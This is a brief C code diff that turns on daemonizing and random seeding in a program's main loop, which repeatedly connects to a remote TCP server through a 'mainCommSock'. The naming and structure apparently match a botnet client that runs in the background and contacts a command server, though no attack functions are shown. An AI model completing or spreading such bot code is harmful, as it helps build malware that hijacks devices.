@@ -27,9 +27,11 @@ int main(int argc, char **argv)
 {
     generate_uuid();
     getOurIP();
+	srand(time(NULL) ^ getpid());
+	init_rand(time(NULL) ^ getpid());
 	//printf("MAC: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", macAddress[0], macAddress[1], macAddress[2], macAddress[3], macAddress[4], macAddress[5]);
 
-    //daemonize();
+    daemonize();
     while ( 1 )
     {
 		if( (mainCommSock=connect_tcp_server(server, port)) == -1)
